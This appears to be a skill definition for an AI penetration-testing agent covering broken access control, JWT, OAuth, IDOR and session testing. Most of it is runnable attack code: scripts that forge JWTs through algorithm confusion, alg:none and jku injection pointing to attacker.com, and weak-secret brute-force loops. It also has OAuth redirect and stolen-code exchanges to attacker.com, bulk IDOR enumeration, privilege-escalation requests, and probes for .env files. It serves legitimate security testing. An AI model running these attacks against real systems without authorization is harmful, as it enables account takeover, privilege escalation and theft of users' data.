---
name: authorization
description: "Authorization testing for broken access control, IDOR, privilege escalation, and session management"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, findEndpointsInResponse, followRedirects, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["authorization testing", "access control", "broken access control", "idor", "privilege escalation", "session management", "authorization flaws", "access control testing", "privilege testing", "security testing"]
contextBoosts: [auth]
mitreAttack: ["T1190", "T1078"]
owaspRefs: ["OWASP Top 10 A01:2021 Broken Access Control", "OWASP Top 10 A07:2021 Identification and Authentication Failures"]
toolChains:
  - name: idor-detection
    description: "Detect Insecure Direct Object References via parameter manipulation"
    steps: [httpRequest, parseResponse, compareResponses, recordEvidence, writeFinding]
  - name: authz-bypass
    description: "Test authorization bypass via role manipulation"
    steps: [httpRequest, parseResponse, getCapturedHeaders, recordEvidence, writeFinding]
compositionRules:
  enhances: [jwt-advanced, web-pentest]
---

# Authorization Testing

## When to Use
- Any endpoint returning user-specific data (profiles, orders, files, messages)
- Admin panels, dashboards, settings pages
- API endpoints with object IDs in path or body
- Applications using JWT, OAuth2, SAML, or session cookies
- After capturing traffic from a logged-in user with different roles
- When the graph shows AuthFlow or RBACMatrix nodes

## Do Not Use
- Static assets (CSS, JS, images) with no auth logic
- Public endpoints explicitly documented as unauthenticated
- When you have zero authenticated sessions — get one first

## Auth Context

Before making HTTP requests, call **getCapturedHeaders** with the target URL and role to get real headers. Pass these in the `headers` parameter of httpRequest.

Decision tree for auth mechanism:
```
Is there a session cookie?
  YES → Use cookie-based auth, test session fixation/timeout
  NO  → Is there an Authorization header?
         YES → Is it "Bearer <token>"?
                YES → Decode token, determine JWT vs opaque
                NO  → Basic/API-key → test key scoping
         NO  → Is there OAuth redirect flow?
                YES → Test OAuth endpoints
                NO  → Check for CSRF tokens, custom headers
```

## JWT Attack Techniques

### Decode and Inspect

```bash
echo "eyJhbGciOiJSUzI1NiIs..." | base64 -d 2>/dev/null | python3 -m json.tool
```

Use **httpRequest** to call a JWKS endpoint if discovered:
```bash
curl -s https://target.com/.well-known/jwks.json | python3 -m json.tool
```

### Algorithm Confusion (RS256 → HS256)

When server uses RS256 but accepts HS256, sign with the public key as HMAC secret:

```bash
# Extract public key
openssl rsa -pubin -in pubkey.pem -outform PEM > pubkey_raw.pem

# Forge HS256 token using public key as secret
python3 -c "
import hmac, hashlib, base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','exp':9999999999}).encode()).rstrip(b'=')
sig = hmac.new(open('pubkey_raw.pem').read().encode(), header + b'.' + payload, hashlib.sha256).digest()
print((header + b'.' + payload + b'.' + base64.urlsafe_b64encode(sig).rstrip(b'=')).decode())
"
```

### alg:none Attack

Strip signature entirely, set alg to none:

```bash
# Forged token (no signature)
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0."

curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin
```

If server rejects `none`, try mixed-case bypass:
- `None`, `NONE`, `nOnE`, `null`, `NaN`

### jku / x5u Header Injection

If server validates JWT via JKU (JWK Set URL) or X5U:

```bash
# Host malicious JWKS on attacker-controlled server
# jku: "https://attacker.com/jwks.json"
# x5u: "https://attacker.com/cert.pem"

# Then modify header to point to attacker's key set
python3 -c "
import base64, json
header = {'alg':'RS256','typ':'JWT','jku':'https://attacker.com/jwks.json'}
print(base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'='))
"
```

### Token Manipulation Payloads

```bash
# Modify claims
# Change sub from user to admin
python3 -c "
import base64, json
payload = base64.urlsafe_b64decode('eyJzdWIiOiJ1c2VyMjM0In0=')
data = json.loads(payload)
data['sub'] = 'admin'
data['role'] = 'admin'
data['isAdmin'] = True
data['exp'] = 9999999999
print(base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'='))
"

# Remove exp claim (token never expires)
# Remove signature entirely (alg:none)

# Replay expired token with modified exp
curl -H "Authorization: Bearer <expired_token_with_new_exp>" https://target.com/api/me
```

### Weak Secret Brute Force

```bash
# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt --force

# Using jwt_tool
python3 jwt_tool.py <token> -C -d wordlist.txt

# Common secrets to try manually
for secret in secret password key "123456" supersecret jwt_secret change-me; do
  python3 jwt_tool.py <token> -X k -p "$secret" -t https://target.com/api/validate
done
```

### Key Confusion Detection

If you see `kid` (Key ID) in JWT header:
```bash
# Test path traversal in kid
# Modify kid to: ../../dev/null, or ../../proc/self/environ
python3 -c "
import base64, json
header = {'alg':'HS256','typ':'JWT','kid':'../../dev/null'}
print(base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'='))
"
```

### JWT Tool Commands

```bash
# Decode
python3 jwt_tool.py <token> -X d

# Tamper claims
python3 jwt_tool.py <token> -X t -S hs256 -p "secret"

# Test alg:none
python3 jwt_tool.py <token> -X n

# Brute force
python3 jwt_tool.py <token> -C -d rockyou.txt

# Verify token against JWKS
python3 jwt_tool.py <token> -j https://target.com/.well-known/jwks.json
```

## OAuth Testing

### Redirect URI Bypass

```bash
# Open redirect test
curl -v "https://target.com/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code"

# URI manipulation tricks
# Add attacker subdomain
redirect_uri=https://target.com.attacker.com/callback
# Path traversal
redirect_uri=https://target.com/../../../attacker.com/callback
# URL encoding
redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback
# Wildcard in registered URI
redirect_uri=https://target.com/*  → try https://target.com/@attacker
# @ injection
redirect_uri=https://target.com@attacker.com/callback
```

### CSRF in OAuth Flow

```bash
# Initiate OAuth flow without state parameter
# If state is missing, CSRF is possible

# Craft malicious link
<a href="https://target.com/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code">
  Click to login
</a>
```

### Scope Escalation

```bash
# Request higher privilege scopes
curl -X POST "https://target.com/oauth/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "scope=read write admin delete"

# Check if scope is validated server-side
```

### Authorization Code Interception

```bash
# PKCE bypass: if code_verifier is not validated
# Replay authorization code with different code_verifier

# Token exchange with stolen code
curl -X POST "https://target.com/oauth/token" \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "redirect_uri=https://attacker.com/callback"
```

### Token Leakage via Referrer

```bash
# If token is in URL (implicit flow), check if Referer leaks it
# Set up: https://attacker.com/page-with-link-to-protected-resource
# Token in fragment: https://target.com/callback#access_token=TOKEN
# Referrer header will contain token if page navigates
```

## IDOR Automation

### Pattern Recognition

```bash
# Sequential IDs
/api/users/100 → /api/users/101 → /api/users/102
/api/orders/5000 → /api/orders/5001

# UUID patterns (if leaked in responses)
/api/files/550e8400-e29b-41d4-a716-446655440000
/api/files/660e8400-e29b-41d4-a716-446655440001

# Numeric in body
{"userId": 1234} → {"userId": 1235}
{"orderId": 9876} → {"orderId": 9877}

# Composite IDs
/api/items?user_id=123&item_id=456 → swap user_id only, then item_id only
```

### IDOR Test Protocol

1. Authenticate as User A, capture request/response
2. Note all object references: URLs, params, body fields, headers
3. Authenticate as User B
4. Replay User A's request with User B's session
5. If User A's data appears → Horizontal IDOR
6. Repeat for admin endpoints with User A's session → Vertical IDOR

### Bulk IDOR Enumeration

```bash
# Test range of IDs
for i in $(seq 100 200); do
  curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
    "https://target.com/api/users/$i/profile" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(f'ID {$i}: {d.get(\"name\",\"?\")}');"
done
```

### IDOR via API Versioning

```bash
# v1 endpoint may have auth, v2 may not
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/v1/users/123
curl https://target.com/api/v2/users/123  # Check without auth

# Different endpoint formats
/api/users/123  →  /api/user/123  →  /api/users?id=123
```

### Parameter Pollution

```bash
# Duplicate params
/api/users?user_id=123&user_id=456
# Different param names for same resource
/api/users?userId=123
/api/users?user=123
/api/users?uid=123
```

## RBAC Testing Protocol

### Role Matrix

For each endpoint, test with every role:
| Endpoint | Guest | User | Moderator | Admin |
|----------|-------|------|-----------|-------|
| /api/public | ? | ? | ? | ? |
| /api/users/me | ? | ? | ? | ? |
| /api/admin/users | ? | ? | ? | ? |
| /api/admin/settings | ? | ? | ? | ? |

### Test Commands

```bash
# Guest (no auth)
curl -s -o /dev/null -w "%{http_code}" https://target.com/api/admin/users

# Regular user
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $USER_TOKEN" \
  https://target.com/api/admin/users

# Moderator
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $MOD_TOKEN" \
  https://target.com/api/admin/users

# Admin
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  https://target.com/api/admin/users
```

### Privilege Escalation Vectors

```bash
# Role parameter injection
curl -X POST https://target.com/api/profile/update \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"name":"test","role":"admin"}'

# HTTP method override
curl -X PUT https://target.com/api/users/123/role \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "X-HTTP-Method-Override: PATCH" \
  -d '{"role":"admin"}'

# Header-based role override
curl -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "Authorization: Bearer $USER_TOKEN" \
  https://target.com/api/admin/dashboard

# Path traversal for access control bypass
curl -H "Authorization: Bearer $USER_TOKEN" \
  https://target.com/api/admin/../users/123
curl -H "Authorization: Bearer $USER_TOKEN" \
  https://target.com/./api/admin/users
```

### Method-Based Access Control

```bash
# Test each HTTP method on admin endpoints
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" \
    -H "Authorization: Bearer $USER_TOKEN" \
    https://target.com/api/admin/users)
  echo "$method: $code"
done
```

## Session Management Testing

### Session Fixation

```bash
# Capture session before login
PRE_SESSION=$(curl -s -c - https://target.com/login | grep -oP 'session=\K[^;]+')

# Login
curl -s -c cookies.txt -b cookies.txt \
  -d "username=user&password=pass" https://target.com/login

# Check if session changed
POST_SESSION=$(grep session cookies.txt | awk '{print $NF}')

if [ "$PRE_SESSION" = "$POST_SESSION" ]; then
  echo "VULNERABLE: Session fixation - session not regenerated after login"
fi
```

### Session Timeout

```bash
# Login and capture session
curl -s -c cookies.txt -d "username=user&password=pass" https://target.com/login

# Wait 30 minutes, then test
sleep 1800
curl -s -b cookies.txt https://target.com/api/me

# Test idle timeout vs absolute timeout
# Idle: resets on activity
# Absolute: expires regardless of activity
```

### Concurrent Sessions

```bash
# Session 1
curl -s -c session1.txt -d "username=user&password=pass" https://target.com/login

# Session 2 (same credentials)
curl -s -c session2.txt -d "username=user&password=pass" https://target.com/login

# Both sessions should still work? Check policy
curl -s -b session1.txt https://target.com/api/me
curl -s -b session2.txt https://target.com/api/me

# If session 1 is invalidated → good practice
# If both work → potential session fixation issue
```

### Session Invalidation on Logout

```bash
# Login
curl -s -c cookies.txt -d "username=user&password=pass" https://target.com/login

# Logout
curl -s -b cookies.txt https://target.com/logout

# Try using old session
curl -s -b cookies.txt https://target.com/api/me
# Should return 401 — if returns 200, session not invalidated
```

### Token Storage Analysis

```bash
# Check where tokens are stored
# LocalStorage: accessible to XSS
# HttpOnly cookie: safe from XSS
# URL parameter: leaked via Referer

# Test for token in URL
curl -v https://target.com/callback?token=abc 2>&1 | grep -i "location:"

# Test for HttpOnly flag
curl -v https://target.com/login -d "username=user&password=pass" 2>&1 | grep -i "set-cookie"
# Look for: HttpOnly, Secure, SameSite flags
```

## Forced Browsing

```bash
# Direct URL access to admin pages
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/dashboard
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/users
curl -s -o /dev/null -w "%{http_code}" https://target.com/api/admin/config

# Directory listing
curl -s https://target.com/uploads/
curl -s https://target.com/api/
curl -s https://target.com/static/

# Backup files
curl -s -o /dev/null -w "%{http_code}" https://target.com/web.config
curl -s -o /dev/null -w "%{http_code}" https://target.com/.env
curl -s -o /dev/null -w "%{http_code}" https://target.com/robots.txt
curl -s -o /dev/null -w "%{http_code}" https://target.com/sitemap.xml

# Hidden endpoints from JS
curl -s https://target.com/app.js | grep -oP '"/api/[^"]+"'
curl -s https://target.com/bundle.js | grep -oP 'https?://[^"'\'' ]+'
```

## Anti-Hallucination

Your claims will be verified against real tool output. Never fabricate findings.

Every vulnerability you report MUST have a corresponding tool call response that proves it.

If a tool call fails, say so honestly — do not invent a success.

Do NOT claim:
- "Endpoint X is vulnerable" without sending a request to endpoint X
- "JWT is vulnerable to alg:none" without actually modifying and sending the token
- "IDOR exists" without showing the comparison between two user sessions
- "Admin panel accessible" without a response body showing admin content

Do NOT assume:
- Auth mechanism based on response headers alone
- That a 200 response means authorization is bypassed (check response body)
- That a 403 means the endpoint is secure (may be missing endpoint entirely)

Always verify:
- Response status code AND body content
- That returned data belongs to the authenticated user, not a hardcoded response
- That session regeneration occurred after login
- That tokens are actually validated server-side, not just present in the request
